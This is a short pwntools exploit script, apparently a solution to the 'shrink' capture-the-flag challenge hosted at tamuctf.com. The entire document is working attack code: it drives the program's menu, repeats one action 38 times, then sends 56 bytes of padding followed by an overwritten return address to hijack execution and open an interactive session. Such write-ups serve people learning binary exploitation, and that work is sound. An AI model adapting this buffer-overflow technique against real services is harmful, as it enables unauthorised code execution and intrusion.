from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="shrink")
# p = process("./shrink")

def change(data):
    p.sendlineafter(b'Exit\n', b'2')
    p.sendafter(b'name: \n', data)
def make():
    p.sendlineafter(b'Exit\n', b'3')
def exit_():
    p.sendlineafter(b'Exit\n', b'4')

for _ in range(38):
    make()

win = 0x403fc8

change(b'A')
payload  = b'A'*56
payload += p64(0x401255)
change(payload)
exit_()

p.interactive()
